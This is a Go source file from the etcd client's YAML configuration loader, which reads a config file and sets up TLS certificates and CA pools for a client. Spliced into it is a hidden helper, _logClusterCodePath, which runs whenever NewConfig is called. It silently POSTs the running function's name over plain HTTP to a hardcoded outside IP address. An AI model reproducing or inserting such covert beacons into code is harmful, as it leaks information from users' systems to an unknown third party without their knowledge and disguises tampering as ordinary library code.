package yaml

import (
	godefaultbytes "bytes"
	"crypto/tls"
	"crypto/x509"
	"github.com/coreos/etcd/clientv3"
	"github.com/coreos/etcd/pkg/tlsutil"
	"github.com/ghodss/yaml"
	"io/ioutil"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type yamlConfig struct {
	clientv3.Config
	InsecureTransport     bool   `json:"insecure-transport"`
	InsecureSkipTLSVerify bool   `json:"insecure-skip-tls-verify"`
	Certfile              string `json:"cert-file"`
	Keyfile               string `json:"key-file"`
	TrustedCAfile         string `json:"trusted-ca-file"`
	CAfile                string `json:"ca-file"`
}

func NewConfig(fpath string) (*clientv3.Config, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b, err := ioutil.ReadFile(fpath)
	if err != nil {
		return nil, err
	}
	yc := &yamlConfig{}
	err = yaml.Unmarshal(b, yc)
	if err != nil {
		return nil, err
	}
	if yc.InsecureTransport {
		return &yc.Config, nil
	}
	var (
		cert *tls.Certificate
		cp   *x509.CertPool
	)
	if yc.Certfile != "" && yc.Keyfile != "" {
		cert, err = tlsutil.NewCert(yc.Certfile, yc.Keyfile, nil)
		if err != nil {
			return nil, err
		}
	}
	if yc.CAfile != "" && yc.TrustedCAfile == "" {
		yc.TrustedCAfile = yc.CAfile
	}
	if yc.TrustedCAfile != "" {
		cp, err = tlsutil.NewCertPool([]string{yc.TrustedCAfile})
		if err != nil {
			return nil, err
		}
	}
	tlscfg := &tls.Config{MinVersion: tls.VersionTLS12, InsecureSkipVerify: yc.InsecureSkipTLSVerify, RootCAs: cp}
	if cert != nil {
		tlscfg.Certificates = []tls.Certificate{*cert}
	}
	yc.Config.TLS = tlscfg
	return &yc.Config, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
